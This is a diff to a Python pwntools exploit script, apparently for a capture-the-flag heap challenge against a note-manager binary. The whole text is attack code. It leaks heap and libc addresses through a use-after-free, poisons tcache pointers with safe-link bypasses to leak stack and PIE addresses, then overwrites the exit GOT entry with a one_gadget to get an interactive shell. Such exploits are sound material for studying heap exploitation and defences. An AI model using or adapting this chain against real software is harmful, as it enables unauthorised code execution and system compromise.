@@ -55,20 +55,29 @@ def remove_note(index):
     r.sendlineafter("slot: ", index)
 
 
+def safe_link(addr, heap_base):
+    return (heap_base >> 12 ) ^ ( addr )
 
 def main():
 
 
 
-    create_note("0", 0x400) # tcache entry for 0x400 bin
-    create_note("1", 0x420) # to be in the unsorted bin 
-    create_note("2", 0x400) # tcache entry for 0x400 bin
-    create_note("3", 0x500) # unfreed chunck to prevent consolidation
+    # Tcache entries
+    create_note("0", 0x400) 
+    create_note("2", 0x400)
     
-    # Fill the tcache and the unsorted bin
+    create_note("1", 0x420) # to be in the unsorted bin
+    create_note("3", 0x500) # unfreed to prevent consolidation
+    
+    # move 0,2 to tcache
     remove_note("0")
-    remove_note("1")
     remove_note("2")
+    # move 1 to unsorted bin
+    remove_note("1")
+
+
+    # read the freed chunks to leak libc and heap
+
     heap_leak = u64(read_note("0")[:6].ljust(8, b"\x00")) 
     heap_base = int(hex(heap_leak) + "000", 16)
     print("heap base @ ", hex(heap_base))
@@ -76,43 +85,37 @@ def main():
     libc_leak = u64(read_note("1")[:6].ljust(8, b"\x00"))
     print(hex(libc_leak))
     libc.address = libc_leak - 0x1d2cc0
-    libc_got = libc.address + 0x1d2028
-    print(hex(libc_got))
     print("libc base @ ", hex(libc.address))
 
 
-    # Load the libc environ address into tcache then read it to leak the stack address
-    read_target = (heap_base >> 12 ) ^ (libc.symbols["environ"] ) # safe linking
-    
-    payload = flat(
-        p64(read_target),
+    # overwrite the tcache fd pointer to point to libc environ
 
-    )
-    modify_note("2", payload)
+    modify_note("2", p64(safe_link(libc.symbols["environ"], heap_base))) # overwrite tcache fd pointer
 
-
+    # pulling the environ address from tcache to chuncks[6] then read it's value (stack leak)
     create_note("5", 0x400)
     create_note("6", 0x400)
     stack_leak = u64(read_note("6")[:6].ljust(8, b"\x00"))
 
     print("stack leak", hex(stack_leak))
 
-    rip_addr = stack_leak - 312 
+    # stack address that have pie address
+    rip_addr = stack_leak - 312
     print("rip addr", hex(rip_addr))
 
-    stack_target = (heap_base >> 12 ) ^ ( rip_addr )
-
-    # read the exe pie leak from the stack
     create_note("0", 0x50)
     create_note("2", 0x50)
     remove_note("2")
     remove_note("0")
+    
+    # overwrite the tcache fd pointer to point to rip address
+
     modify_note("0", flat(
-        p64(stack_target)
+            p64(safe_link(rip_addr, heap_base))
     ))
 
 
-    # override exit GOT entry with one_gadget
+    # pulling the rip address from tcache to chuncks[4] then read it's value (pie)
     create_note("3", 0x50)
     create_note("4", 0x50)
     
@@ -120,25 +123,24 @@ def main():
     leaks = read_note("4")
 
     pie_leak = u64(leaks[40:46].ljust(8, b"\x00"))
-    exe.address = pie_leak - 0x5c4 -0x1000
+    exe.address = pie_leak - 0x15c4 
     print("pie leak:", hex(pie_leak))
     print("exe address:", hex(exe.address))
-    print("here2")
 
 
+    
     create_note("0", 0x100)
     create_note("2", 0x100)
     remove_note("2")
     remove_note("0")
 
-    
-    
+    # overwrite the tcache fd pointer to point to exe.got.exit
 
-
-    free_target = (heap_base >> 12 ) ^ (exe.got.exit )
     modify_note("0", flat(
-        p64(free_target)
-    ))
+        p64(safe_link(exe.got.exit, heap_base)
+    )))
+
+    # pulling the exe.got.exit address from tcache to chuncks[4] then read it's value (pie)
 
     create_note("3", 0x100)
     create_note("4", 0x100)
@@ -147,13 +149,8 @@ def main():
     r.sendlineafter("> ", "5")  # exit -> one_gadget
 
 
-
-
-
-
     r.interactive()
 
 
 if __name__ == "__main__":
     main()
-
